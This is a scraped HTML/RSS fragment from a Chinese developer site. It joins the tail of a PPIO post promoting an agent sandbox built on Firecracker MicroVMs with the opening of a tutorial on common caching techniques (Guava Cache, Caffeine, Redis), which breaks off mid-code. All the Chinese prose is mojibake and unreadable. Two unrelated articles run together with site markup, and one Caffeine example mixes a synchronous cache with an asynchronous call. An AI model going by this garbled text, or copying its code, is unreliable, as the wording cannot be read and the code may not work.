<p>åœ¨æ•´ä¸ª Agent Infra ä½“ç³»ä¸­ï¼Œæœ€æ ¸å¿ƒçš„éƒ¨åˆ†æˆ‘ä»¬è®¤ä¸ºæ˜¯ <strong>Runtime</strong>ã€‚</p>
<p>Runtime è§£å†³çš„æ˜¯ â€œèƒ½ä¸èƒ½è·‘èµ·æ¥â€ çš„é—®é¢˜ï¼ŒçœŸæ­£çš„æ™ºèƒ½ä½“èƒ½å¦åœ¨å„ç§ç¯å¢ƒä¸‹å¤§è§„æ¨¡ã€é€šç”¨åœ°é€‚é…å¹¶ç¨³å®šè¿è¡Œï¼Œä¾èµ–çš„æ­£æ˜¯æŠŠä¸åŒèƒ½åŠ›è¿›è¡Œç»¼åˆè°ƒåº¦çš„ Runtimeï¼Œè¿™ä¹Ÿæ˜¯ Agent Infra çš„æ ¸å¿ƒæ‰€åœ¨ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c82ce7d11d714ebfba8a350c6aea3473~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457554&amp;x-signature=MGyZB2TH6tS02lipnp67jKmLhCc%3D" alt="" loading="lazy"/></p>
<p>PPIO æ˜¯ä¸€å®¶ AI äº‘è®¡ç®—å…¬å¸ï¼Œæˆ‘ä»¬ä»åº•å±‚ç®—åŠ›åˆ° IaaSã€PaaSï¼Œå†åˆ° MaaSï¼Œé€å±‚æ„å»ºäº†å®Œæ•´çš„ AI äº‘èƒ½åŠ›ï¼Œä¸º Agent Infra æä¾›åº•åº§æ”¯æ’‘ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7374183cb84e4cedb603e817355b9c5d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457554&amp;x-signature=ePZHimGxm7DIM4F2vFV9ASJMy7o%3D" alt="" loading="lazy"/></p>
<p>è‡ª 2020 å¹´ç®—åŠ›å‡ºç°çŸ­ç¼ºå¼€å§‹ï¼Œæˆ‘ä»¬æ•´åˆå¤§é‡æ•°æ®ä¸­å¿ƒé—²ç½®ç®—åŠ›ï¼Œæ„å»ºåˆ†å¸ƒå¼ç®—åŠ›ç½‘ç»œã€‚å¦‚ä»Šæˆ‘ä»¬åœ¨ä¸­å›½å·²æœ‰ <strong>4000 + ç®—åŠ›èŠ‚ç‚¹</strong>ã€1300 å¤šä¸ªèƒ½æä¾›å¤§é‡åˆ†å¸ƒå¼ç®—åŠ›çš„åˆä½œä¼™ä¼´ï¼›2023 å¹´ä» CPU æ‰©å±•åˆ° GPUï¼›2024 å¹´æˆ‘ä»¬åœ¨å…¨çƒå…­<strong>å¤§æ´²ä¸‰åå¤šä¸ªåœ°åŒº</strong>å’Œå›½å®¶å¼€å§‹éƒ¨ç½²ç®—åŠ›ç½‘ç»œèƒ½åŠ›ï¼Œæ•´åˆå…¨çƒå„åœ°çš„ç®—åŠ›èµ„æºï¼Œè¿™æ˜¯æˆ‘ä»¬çš„ç¬¬ä¸€å±‚ã€‚</p>
<p>ç¬¬äºŒå±‚æ˜¯ GPU æ¨ç†äº‘å¹³å°ã€‚2023 å¹´æˆ‘ä»¬æ‰“é€ äº†<strong>ç¬¬ä¸€ä»£æ¨ç†äº‘å¹³å°</strong>ï¼Œå®ç°å¼‚æ„ç®—åŠ›çš„ç»Ÿä¸€è°ƒåº¦ã€‚2024 å¹´æ¨å‡ºåˆ†å¸ƒå¼æ¨ç†å¼•æ“ï¼Œå¹¶æ‰˜ç®¡è¿‘ç™¾ä¸ªå¼€æºä¸ç¤¾åŒºæ¨¡å‹ï¼Œæ¯å¤©å¤„ç†æ¥è¿‘ <strong>2000 äº¿ Token</strong>ï¼Œä¸ºæ¨¡å‹æä¾›æ¨ç†åŠ é€Ÿã€é™æœ¬å’Œæ€§èƒ½å¢å¼ºï¼Œæ˜¯æ”¯æ’‘å¼€æºæ¨¡å‹è½åœ°çš„é‡è¦åŸºç¡€ã€‚</p>
<p>åŸºäºå‰æœŸç§¯ç´¯ï¼Œæˆ‘ä»¬åœ¨ä»Šå¹´ WAIC å‘å¸ƒäº†é¦–ä¸ªå…¼å®¹ E2B çš„ <strong>Agent æ²™ç®±</strong>ï¼Œä»¥ Runtime ä¸ºæ ¸å¿ƒæ•´åˆæ¨¡å‹è°ƒç”¨ã€çŸ­æœŸ / é•¿æœŸè®°å¿†å’Œæ•°æ®åº“èƒ½åŠ›ï¼Œå¸®åŠ©å¤´éƒ¨ Agent å‚å•†è§„æ¨¡åŒ–è½åœ°ï¼Œé€šè¿‡æ›´å®‰å…¨ã€æ•æ·çš„æ²™ç®±ä½“ç³»é™ä½é”™è¯¯ç‡ã€‚</p>
<p>è¯¥æ²™ç®±æ˜¯ä¸“ä¸º Agent æ‰§è¡Œä»»åŠ¡è®¾è®¡çš„äº‘ç«¯è¿è¡Œç¯å¢ƒï¼Œä¸º Agent èµ‹äºˆå®‰å…¨å¯é ã€é«˜æ•ˆæ•æ·çš„ â€œæ‰‹å’Œè„šâ€ï¼Œæ²™ç®±å†…æ”¯æŒåŠ¨æ€è°ƒç”¨ Browser useã€Computer useã€MCPã€RAGã€Search ç­‰å„ç§å·¥å…·ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ae777b358cf4b1088539d009ad7ecde~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457554&amp;x-signature=ead2%2BmBC2%2ByvNEO8UjgNQ0ndiOA%3D" alt="" loading="lazy"/></p>
<p>PPIO Agent æ²™ç®±åŸºäº Firecracker MicroVM æ„å»ºï¼Œå…·å¤‡å¼ºå®‰å…¨éš”ç¦»ã€æ¯«ç§’çº§æé€Ÿå¯åŠ¨ã€é«˜å¹¶å‘åˆ›å»ºä¸‰å¤§ç‰¹æ€§ï¼Œæ— éœ€é¢„éƒ¨ç½²ï¼Œå³å¯å³ç”¨ï¼Œè®© Agent çš„æ‰€æœ‰æ“ä½œå‡å¤„äº â€œå—é™ã€å¯æ§â€ çš„çŠ¶æ€ã€‚</p>
<p>å¼ºå®‰å…¨éš”ç¦»ï¼Œè®©ä¸åŒ Agent æ²™ç®±çš„ç¯å¢ƒå¯å®ç°å®Œå…¨éš”ç¦»ï¼Œå½“å¤šä¸ªä»»åŠ¡å¹¶å‘æ‰§è¡Œæ—¶ï¼Œæ¯ä¸ªä»»åŠ¡éƒ½èƒ½åœ¨ç‹¬ç«‹ç¯å¢ƒä¸­è¿è¡Œï¼Œä»æ ¹æºä¸Šé¿å…æ•°æ®æ³„æ¼å’Œèµ„æºæŠ¢å å†²çªã€‚</p>
<p>å°äº 200ms çš„æé€Ÿå¯åŠ¨æ—¶é—´ï¼Œè¿œè¿œå°äºä¼ ç»Ÿè™šæ‹Ÿæœºæ²™ç®±æ•°åˆ†é’Ÿç”šè‡³æ›´é•¿çš„æ—¶æ•ˆï¼Œå¯ç¬é—´åˆ›å»ºæ²™ç®±ç¯å¢ƒã€è¿è¡Œç”Ÿæˆçš„ä»£ç å¹¶å±•ç¤ºé¢„è§ˆæ•ˆæœï¼Œå¤§å¹…æå‡ç”¨æˆ·çš„å¼€å‘æµç•…åº¦ã€‚</p>
<p>å¹¶ä¸” PPIO Agent æ²™ç®±è¿˜æ”¯æŒåŒæ—¶å¿«é€Ÿå¯åŠ¨æ•°åƒä¸ªæ²™ç®±å®ä¾‹çš„é«˜å¹¶å‘åˆ›å»ºèƒ½åŠ›ï¼Œå¯å……åˆ†æ»¡è¶³ä¸šåŠ¡åœºæ™¯ä¸­çš„é«˜å¹¶å‘éœ€æ±‚ï¼ŒåŠ å¿«ç»“æœäº¤ä»˜é€Ÿåº¦ï¼Œä¿éšœç”¨æˆ·ä½“éªŒã€‚</p>
<p>æ²™ç®±ä¸Šçº¿ä»¥æ¥ï¼Œæœˆåº¦æ´»è·ƒæ•°åœ¨æŒç»­å¢é•¿ï¼Œæˆ‘ä»¬å¸Œæœ›é€šè¿‡ Agent Infra æˆä¸º AI æ—¶ä»£æ–°çš„æ“ä½œç³»ç»Ÿï¼Œå¸®åŠ©æ›´å¤šå¼€å‘è€…æˆé•¿ä¸åˆ›ä¸šã€‚</p>
<p><strong>æ¬¢è¿åœ¨è¯„è®ºåŒºç•™ä¸‹ä½ çš„æƒ³æ³•ï¼</strong></p>
<p>â€”Â <strong>å®Œ</strong>Â â€”</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å·¥ä½œä¸­æœ€å¸¸ç”¨çš„6ç§ç¼“å­˜]]></title>    <link>https://juejin.cn/post/7583980250733559871</link>    <guid>https://juejin.cn/post/7583980250733559871</guid>    <pubDate>2025-12-16T02:57:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583980250733559871" data-draft-id="7583969283790159926" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å·¥ä½œä¸­æœ€å¸¸ç”¨çš„6ç§ç¼“å­˜"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-16T02:57:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‹ä¸‰è¯´æŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/465848661970824"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å·¥ä½œä¸­æœ€å¸¸ç”¨çš„6ç§ç¼“å­˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/465848661970824/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‹ä¸‰è¯´æŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T02:57:03.000Z" title="Tue Dec 16 2025 02:57:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>è¿™äº›å¹´æˆ‘å‚ä¸è®¾è®¡è¿‡å¾ˆå¤šç³»ç»Ÿï¼Œè¶Šæ¥è¶Šæ·±åˆ»åœ°è®¤è¯†åˆ°ï¼š<strong>ä¸€ä¸ªç³»ç»Ÿçš„æ€§èƒ½å¦‚ä½•ï¼Œå¾ˆå¤§ç¨‹åº¦ä¸Šå–å†³äºç¼“å­˜ç”¨å¾—æ€ä¹ˆæ ·</strong>ã€‚</p>
<p>åŒæ ·æ˜¯ç¼“å­˜ï¼Œä¸ºä½•æœ‰äººç”¨èµ·æ¥ç³»ç»Ÿé£å‡ï¼Œæœ‰äººå´è¸©å‘ä¸æ–­ï¼Ÿ</p>
<p>æœ‰äº›å°ä¼™ä¼´åœ¨å·¥ä½œä¸­å¯èƒ½é‡åˆ°è¿‡è¿™æ ·çš„å›°æƒ‘ï¼šçŸ¥é“è¦ç”¨ç¼“å­˜ï¼Œä½†é¢å¯¹æœ¬åœ°ç¼“å­˜ã€Redisã€Memcachedã€CDNç­‰å¤šç§é€‰æ‹©ï¼Œåˆ°åº•è¯¥ç”¨å“ªç§ï¼Ÿ</p>
<p>ä»Šå¤©è¿™ç¯‡æ–‡ç« è·Ÿå¤§å®¶ä¸€èµ·èŠèŠå·¥ä½œä¸­æœ€å¸¸ç”¨çš„6ç§ç¼“å­˜ï¼Œå¸Œæœ›å¯¹ä½ ä¼šæœ‰æ‰€å¸®åŠ©ã€‚</p>
<p><a href="https://link.juejin.cn/?target=http%3A%2F%2Fsusan.net.cn%2Fproject" title="https://link.juejin.cn/?target=http%3A%2F%2Fsusan.net.cn%2Fproject" target="_blank">æ›´å¤šé¡¹ç›®å®æˆ˜åœ¨æˆ‘çš„æŠ€æœ¯ç½‘ç«™ï¼šwww.susan.net.cn/project</a></p>
<h2 data-id="heading-1">01 ä¸ºä»€ä¹ˆç¼“å­˜å¦‚æ­¤é‡è¦ï¼Ÿ</h2>
<p>åœ¨æ­£å¼ä»‹ç»å„ç§ç¼“å­˜ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆè¦æ˜ç™½ï¼š<strong>ä¸ºä»€ä¹ˆè¦ç”¨ç¼“å­˜ï¼Ÿ</strong></p>
<p>æƒ³è±¡è¿™æ ·ä¸€ä¸ªåœºæ™¯ï¼šä½ çš„ç”µå•†ç½‘ç«™é¦–é¡µï¼Œæ¯æ¬¡æ‰“å¼€éƒ½è¦ä»æ•°æ®åº“ä¸­æŸ¥è¯¢è½®æ’­å›¾ã€çƒ­é—¨å•†å“ã€åˆ†ç±»ä¿¡æ¯ç­‰æ•°æ®ã€‚</p>
<p>å¦‚æœæ¯ç§’æœ‰1ä¸‡ä¸ªç”¨æˆ·è®¿é—®ï¼Œæ•°æ®åº“å°±è¦æ‰¿å—1ä¸‡æ¬¡æŸ¥è¯¢å‹åŠ›ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ²¡æœ‰ç¼“å­˜æ—¶çš„æŸ¥è¯¢</span>
<span class="hljs-keyword">public</span> Product <span class="hljs-title function_">getProductById</span><span class="hljs-params">(Long id)</span> {
    <span class="hljs-comment">// æ¯æ¬¡éƒ½ç›´æ¥æŸ¥è¯¢æ•°æ®åº“</span>
    <span class="hljs-keyword">return</span> productDao.findById(id); <span class="hljs-comment">// æ¯æ¬¡éƒ½æ˜¯æ…¢é€Ÿçš„ç£ç›˜IO</span>
}
</code></pre>
<p>è¿™å°±æ˜¯å…¸å‹çš„<strong>æ— ç¼“å­˜åœºæ™¯</strong>ã€‚</p>
<p>æ•°æ®åº“çš„ç£ç›˜IOé€Ÿåº¦è¿œä½äºå†…å­˜ï¼Œå½“å¹¶å‘é‡ä¸Šæ¥åï¼Œç³»ç»Ÿå“åº”å˜æ…¢ï¼Œæ•°æ®åº“è¿æ¥æ± è¢«å æ»¡ï¼Œæœ€ç»ˆå¯¼è‡´æœåŠ¡ä¸å¯ç”¨ã€‚</p>
<p>ç¼“å­˜çš„æ ¸å¿ƒä»·å€¼å¯ä»¥ç”¨ä¸‹é¢è¿™ä¸ªå…¬å¼ç†è§£ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">ç³»ç»Ÿæ€§èƒ½ = (ç¼“å­˜å‘½ä¸­ç‡ Ã— ç¼“å­˜è®¿é—®é€Ÿåº¦) + ((<span class="hljs-number">1</span> - ç¼“å­˜å‘½ä¸­ç‡) Ã— åç«¯è®¿é—®é€Ÿåº¦)
</code></pre>
<p>ç¼“å­˜ä¹‹æ‰€ä»¥èƒ½æå‡æ€§èƒ½ï¼ŒåŸºäºä¸¤ä¸ªè®¡ç®—æœºç§‘å­¦çš„åŸºæœ¬åŸç†ï¼š</p>
<ol>
<li><strong>å±€éƒ¨æ€§åŸç†</strong>ï¼šç¨‹åºè®¿é—®çš„æ•°æ®é€šå¸¸å…·æœ‰æ—¶é—´å’Œç©ºé—´å±€éƒ¨æ€§</li>
<li><strong>å­˜å‚¨å±‚æ¬¡ç»“æ„</strong>ï¼šä¸åŒå­˜å‚¨ä»‹è´¨çš„é€Ÿåº¦å·®å¼‚å·¨å¤§ï¼ˆå†…å­˜æ¯”SSDå¿«100å€ï¼Œæ¯”HDDå¿«10ä¸‡å€ï¼‰</li>
</ol>
<p>ä»ç”¨æˆ·è¯·æ±‚åˆ°æ•°æ®è¿”å›ï¼Œæ•°æ®å¯èƒ½ç»è¿‡çš„å„çº§ç¼“å­˜è·¯å¾„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" src="" loading="lazy"/></p>
<p>ç†è§£äº†ç¼“å­˜çš„é‡è¦æ€§ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬é€ä¸€å‰–æè¿™å…­ç§æœ€å¸¸ç”¨çš„ç¼“å­˜æŠ€æœ¯ã€‚</p>
<h2 data-id="heading-2">02 æœ¬åœ°ç¼“å­˜ï¼šæœ€ç®€å•ç›´æ¥çš„æ€§èƒ½æå‡</h2>
<p>æœ¬åœ°ç¼“å­˜æŒ‡çš„æ˜¯åœ¨<strong>åº”ç”¨è¿›ç¨‹å†…éƒ¨</strong>ç»´æŠ¤çš„ç¼“å­˜å­˜å‚¨ï¼Œæ•°æ®å­˜å‚¨åœ¨JVMå †å†…å­˜ä¸­ã€‚</p>
<h3 data-id="heading-3">æ ¸å¿ƒç‰¹ç‚¹</h3>
<ul>
<li><strong>è®¿é—®æœ€å¿«</strong>ï¼šç›´æ¥å†…å­˜æ“ä½œï¼Œæ— ç½‘ç»œå¼€é”€</li>
<li><strong>å®ç°ç®€å•</strong>ï¼šæ— éœ€æ­å»ºé¢å¤–æœåŠ¡</li>
<li><strong>æ•°æ®éš”ç¦»</strong>ï¼šæ¯ä¸ªåº”ç”¨å®ä¾‹ç‹¬äº«è‡ªå·±çš„ç¼“å­˜</li>
</ul>
<h3 data-id="heading-4">å¸¸ç”¨å®ç°</h3>
<p><strong>1. Guava Cache</strong>ï¼šGoogleæä¾›çš„ä¼˜ç§€æœ¬åœ°ç¼“å­˜åº“</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Guava Cache ç¤ºä¾‹</span>
LoadingCache&lt;Long, Product&gt; productCache = CacheBuilder.newBuilder()
    .maximumSize(<span class="hljs-number">10000</span>) <span class="hljs-comment">// æœ€å¤§ç¼“å­˜é¡¹æ•°</span>
    .expireAfterWrite(<span class="hljs-number">10</span>, TimeUnit.MINUTES) <span class="hljs-comment">// å†™å…¥å10åˆ†é’Ÿè¿‡æœŸ</span>
    .expireAfterAccess(<span class="hljs-number">5</span>, TimeUnit.MINUTES) <span class="hljs-comment">// è®¿é—®å5åˆ†é’Ÿè¿‡æœŸ</span>
    .recordStats() <span class="hljs-comment">// å¼€å¯ç»Ÿè®¡</span>
    .build(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheLoader</span>&lt;Long, Product&gt;() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> Product <span class="hljs-title function_">load</span><span class="hljs-params">(Long productId)</span> {
            <span class="hljs-comment">// å½“ç¼“å­˜æœªå‘½ä¸­æ—¶ï¼Œè‡ªåŠ¨åŠ è½½æ•°æ®</span>
            <span class="hljs-keyword">return</span> productDao.findById(productId);
        }
    });

<span class="hljs-comment">// ä½¿ç”¨ç¼“å­˜</span>
<span class="hljs-keyword">public</span> Product <span class="hljs-title function_">getProduct</span><span class="hljs-params">(Long id)</span> {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">return</span> productCache.get(id);
    } <span class="hljs-keyword">catch</span> (ExecutionException e) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"åŠ è½½äº§å“å¤±è´¥"</span>, e);
    }
}
</code></pre>
<p><strong>2. Caffeine</strong>ï¼šGuava Cacheçš„ç°ä»£æ›¿ä»£å“ï¼Œæ€§èƒ½æ›´ä¼˜</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Caffeine ç¤ºä¾‹ï¼ˆæ€§èƒ½ä¼˜äºGuava Cacheï¼‰</span>
Cache&lt;Long, Product&gt; caffeineCache = Caffeine.newBuilder()
    .maximumSize(<span class="hljs-number">10_000</span>)
    .expireAfterWrite(<span class="hljs-number">10</span>, TimeUnit.MINUTES)
    .refreshAfterWrite(<span class="hljs-number">1</span>, TimeUnit.MINUTES) <span class="hljs-comment">// æ”¯æŒåˆ·æ–°ï¼ŒGuavaä¸æ”¯æŒ</span>
    .recordStats()
    .build(productId -&gt; productDao.findById(productId));

<span class="hljs-comment">// å¼‚æ­¥è·å–</span>
<span class="hljs-keyword">public</span> CompletableFuture&lt;Product&gt; <span class="hljs-title function_">getProductAsync</span><span class="hljs-params">(Long id)</span> {
    <span class="hljs-keyword">return</span> caffeineCache.get(id, productId -&gt; 
        CompletableFuture.supplyAsync(() -&gt; productDao.findById(productId)));
}
</code></pre>
<h3 data-id="heading-5">é€‚ç”¨åœºæ™¯</h3>
<ul>
<li>æ•°æ®é‡ä¸å¤§ï¼ˆé€šå¸¸ä¸è¶…è¿‡10ä¸‡æ¡ï¼‰</li>
<li>æ•°æ®å˜åŒ–ä¸é¢‘ç¹</li>
<li>å¯¹è®¿é—®é€Ÿåº¦è¦æ±‚æè‡´</li>
<li>å¦‚ï¼šé…ç½®ä¿¡æ¯ã€é™æ€å­—å…¸ã€ç”¨æˆ·ä¼šè¯ä¿¡æ¯ï¼ˆçŸ­æœŸï¼‰</li>
</ul>
<h3 data-id="heading-6">ä¼˜ç¼ºç‚¹åˆ†æ</h3>
<ul>
<li><strong>ä¼˜ç‚¹</strong>ï¼šæé€Ÿè®¿é—®ã€é›¶ç½‘ç»œå¼€é”€ã€å®ç°ç®€å•</li>
<li><strong>ç¼ºç‚¹</strong>ï¼šæ•°æ®ä¸ä¸€è‡´ï¼ˆå„èŠ‚ç‚¹ç‹¬ç«‹ï¼‰ã€å†…å­˜é™åˆ¶ã€é‡å¯ä¸¢å¤±</li>
</ul>
<p>æœ‰äº›å°ä¼™ä¼´åœ¨å·¥ä½œä¸­å¯èƒ½ä¼šçŠ¯ä¸€ä¸ªé”™è¯¯ï¼šåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­è¿‡åº¦ä¾èµ–æœ¬åœ°ç¼“å­˜ï¼Œå¯¼è‡´å„èŠ‚ç‚¹æ•°æ®ä¸ä¸€è‡´ã€‚è®°ä½ï¼š<strong>æœ¬åœ°ç¼“å­˜é€‚åˆå­˜å‚¨åªè¯»æˆ–å¼±ä¸€è‡´æ€§çš„æ•°æ®</strong>ã€‚</p>
<h2 data-id="heading-7">03 åˆ†å¸ƒå¼ç¼“å­˜ä¹‹ç‹ï¼šRedisçš„æ·±åº¦è§£æ</h2>
<p>å½“æ•°æ®éœ€è¦åœ¨å¤šä¸ªåº”ç”¨å®ä¾‹é—´å…±äº«æ—¶ï¼Œæœ¬åœ°ç¼“å­˜å°±ä¸å¤Ÿç”¨äº†ï¼Œè¿™æ—¶éœ€è¦<strong>åˆ†å¸ƒå¼ç¼“å­˜</strong>ã€‚è€ŒRedisæ— ç–‘æ˜¯è¿™ä¸€é¢†åŸŸçš„ç‹è€…ã€‚</p>
<h3 data-id="heading-8">Redisçš„æ ¸å¿ƒä¼˜åŠ¿</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Spring Boot + Redis ç¤ºä¾‹</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductCacheService</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PRODUCT_KEY_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">"product:"</span>;
